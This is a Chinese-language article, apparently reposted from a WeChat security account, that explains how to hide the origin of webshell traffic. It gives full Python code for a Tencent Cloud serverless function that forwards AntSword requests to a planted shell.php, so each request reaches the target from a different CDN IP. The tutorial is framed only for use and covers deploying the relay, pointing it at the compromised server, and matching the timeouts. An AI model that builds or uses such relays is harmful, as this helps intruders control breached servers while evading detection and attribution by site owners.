> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oTHOL6hMe7TuztR-kyVDWg)

**原理介绍**

这个技术的核心原理是利用腾讯云的云函数将我们的请求进行转发 (和一些使用第三方应用进行转发是一样的)。在国外应该早就玩烂了。

**具体步骤**

**创建函数**

使用默认模板即可，然后选择下一步。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9VLcljKV7knFz6VQ8JPeOdpJ2PWoZR0XgG0aFVy04ZkKxU7pLB9qhY0g/640?wx_fmt=other)

到这里也可以全部默认，函数名称和地域可以自己自由发挥，然后点击完成。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9VblyuKwEwzf7RptzpXbmwX9hT9EhDus4vclgWOSjBu44l3iaj8ffPR3Q/640?wx_fmt=other)

然后依次打开函数管理 - 函数代码。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9Vygp2YdehVg2L7RZyWL5bib34BU0w5pdSH44aAFIRByqIXhAp7BGhlyQ/640?wx_fmt=other)

然后把下面代码替换 index.py 的代码, 点击部署。  

```
# -*- coding: utf8 -*-
import requests
import json
def geturl(urlstr):
    jurlstr = json.dumps(urlstr)
    dict_url = json.loads(jurlstr)
    return dict_url['u']
def main_handler(event, context):
    url = geturl(event['queryString'])
    postdata = event['body']
    headers=event['headers']
    resp=requests.post(url,data=postdata,headers=headers,verify=False)
    response={
        "isBase64Encoded": False,
        "statusCode": 200,
        "headers": {'Content-Type': 'text/html;charset='+resp.apparent_encoding},
        "body": resp.text
    }
    return response
```

点击触发管理，就会看到访问路径，复制备用。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9VS5N8bHaPKBDx0uXJ3EpMy9zKMZSErRWiaeVTBJFIbVgLEqGSicXTlsicg/640?wx_fmt=other)

**开始 Webshell 请求来源隐藏**

打开蚁剑，url 一栏中填入 访问路径 + webshell 地址，列如：

```
https://service-gcuy2k9u-1257053841.gz.apigw.tencentcs.com/release/APIGWHtmlDemo-1614356287?u=https://www.xxx.com/shell.php
```

其他设置和正常使用配置即可，看看效果。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9VU6Mh9ibgBCSOYZSqQNDzuGZ0fGKyENxF3HZpbxzSDbzrf5gGzupibeJw/640?wx_fmt=other)

所有请求都是利用腾讯云的云函数将我们的请求进行转发，云函数的服务器是自带 CDN 的，所以我们每次去请求的 Webshell IP 都是不同的，这就达到了 Webshell 请求来源隐藏。

**注意**

在函数管理 - 函数配置里面，最好把执行超时时间设置成和蚁剑里面的超时时间一样或者更长。

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9Vg4cEaaPmjRn2MVtrjkSHt9dJYAknTutApl64MCcmP5S0wwmeDWmiatA/640?wx_fmt=other)

![](https://mmbiz.qpic.cn/mmbiz/CeRbo31gwe0oggBLVH8PGy2TdWjxmL9VGDGLPcVukvoqoiava2PsE9lIuiauGyA8c86h28JK39zkICb0Z9M6iau9A/640?wx_fmt=other)  

文章来源：白帽兔

```
“如侵权请私聊公众号删文”

EchoSec
萌新专注于网络安全行业学习
10篇原创内容
公众号

我知道你在看哟
```